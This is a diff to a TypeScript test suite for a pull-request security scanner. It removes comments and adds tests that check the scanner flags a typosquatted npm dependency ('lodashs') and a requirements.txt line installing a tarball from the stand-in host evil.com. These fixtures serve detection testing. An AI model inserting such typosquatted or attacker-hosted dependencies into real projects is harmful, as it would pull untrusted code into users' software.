@@ -216,8 +216,6 @@ describe("processScanJob chunk failures", () => {
     });
 
     it("is not switched off by a .secureflowignore the pull request adds on its own branch", async () => {
-      // Nothing on the base branch; the head commit (`abc123`) adds a file that
-      // ignores everything. Only a read at the head would ever see it.
       mocks.getContent.mockImplementation(async ({ ref }: { ref: string }) => {
         if (ref === "main") throw notFound();
         return { data: { content: base64("**\n[placeholders]\nAKIA") } };
@@ -266,7 +264,6 @@ describe("processScanJob chunk failures", () => {
       expect(result.scannedFiles).toBe(0);
       expect(result.zeroScanReason).toBe("no changed files");
 
-      // Verify check run was created with neutral conclusion and emptyReason
       expect(mocks.checksCreate).toHaveBeenCalledWith(
         expect.objectContaining({
           conclusion: "neutral",
@@ -277,7 +274,6 @@ describe("processScanJob chunk failures", () => {
         }),
       );
 
-      // Verify PR comment was posted with Nothing to scan and NO success wording
       expect(mocks.createComment).toHaveBeenCalledTimes(1);
       const commentBody = mocks.createComment.mock.calls[0][0].body;
       expect(commentBody).toContain("Nothing to scan: no changed files.");
@@ -362,7 +358,6 @@ describe("processScanJob chunk failures", () => {
     const base64 = (text: string) => Buffer.from(text).toString("base64");
 
     it("hides findings below repository threshold and states the hidden count in PR comment", async () => {
-      // Mock .secureflow.json from base branch with minCommentConfidence: "HIGH"
       mocks.getContent.mockImplementation(({ path }: { path: string }) => {
         if (path === ".secureflow.json") {
           return Promise.resolve({
@@ -413,21 +408,14 @@ describe("processScanJob chunk failures", () => {
       expect(mocks.createComment).toHaveBeenCalledTimes(1);
       const commentBody = mocks.createComment.mock.calls[0][0].body;
 
-      // Overall count reports total detected
       expect(commentBody).toContain("Detected **2** potential issues");
-
-      // Comment mentions hidden count and threshold
       expect(commentBody).toContain("1 lower-confidence finding");
       expect(commentBody).toContain("below the `HIGH` confidence threshold was hidden");
-
-      // Visible findings list includes HIGH finding, but NOT LOW finding
       expect(commentBody).toContain("High confidence production leak");
       expect(commentBody).toContain("`src/prod.ts`");
       expect(commentBody).toContain("**Confidence:** HIGH");
       expect(commentBody).not.toContain("Low confidence test mock");
       expect(commentBody).not.toContain("`tests/mock.ts`");
-
-      // Result still contains all findings for dashboard visibility and persistence
       expect(result.findings).toHaveLength(2);
     });
 
@@ -479,12 +467,115 @@ describe("processScanJob chunk failures", () => {
 
       const commentBody = mocks.createComment.mock.calls[0][0].body;
 
-      // No findings hidden
       expect(commentBody).not.toContain("lower-confidence finding");
       expect(commentBody).toContain("High confidence issue");
       expect(commentBody).toContain("`src/prod.ts`");
       expect(commentBody).toContain("Low confidence issue");
       expect(commentBody).toContain("`tests/mock.ts`");
+    });
+  });
+
+  describe("deterministic dependency security checks (#2003)", () => {
+    it("reports typosquat findings in package.json with line number and package name", async () => {
+      const manifestFiles = [
+        {
+          filename: "package.json",
+          patch: `--- a/package.json
++++ b/package.json
+@@ -10,3 +10,4 @@
+   "dependencies": {
+     "express": "^4.18.2",
++    "lodashs": "^4.17.21"
+   }
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2003 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: manifestFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const typoFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_TYPOSQUAT"),
+      );
+      expect(typoFinding).toBeDefined();
+      expect(typoFinding?.severity).toBe("HIGH");
+      expect(typoFinding?.description).toContain("lodashs");
+      expect(typoFinding?.description).toContain("lodash");
+      expect(typoFinding?.lineStart).toBe(12);
+
+      const commentBody = mocks.createComment.mock.calls[0][0].body;
+      expect(commentBody).toContain("DEPENDENCY_TYPOSQUAT");
+      expect(commentBody).toContain("`package.json`");
+      expect(commentBody).toContain("lodashs");
+    });
+
+    it("reports git and tarball dependencies in requirements.txt", async () => {
+      const pyFiles = [
+        {
+          filename: "requirements.txt",
+          patch: `--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,2 +1,3 @@
+ flask==2.0.1
++https://evil.com/packages/pkg-1.0.0.tar.gz
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2004 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: pyFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const tarballFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_GIT_OR_TARBALL"),
+      );
+      expect(tarballFinding).toBeDefined();
+      expect(tarballFinding?.severity).toBe("HIGH");
+      expect(tarballFinding?.codeSnippet).toContain("pkg-1.0.0.tar.gz");
+    });
+
+    it("does not report typosquats for legitimate packages", async () => {
+      const safeFiles = [
+        {
+          filename: "package.json",
+          patch: `--- a/package.json
++++ b/package.json
+@@ -10,3 +10,4 @@
+   "dependencies": {
+     "express": "^4.18.2",
++    "lodash": "^4.17.21"
+   }
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2005 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: safeFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const typoFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_TYPOSQUAT"),
+      );
+      expect(typoFinding).toBeUndefined();
     });
   });
 
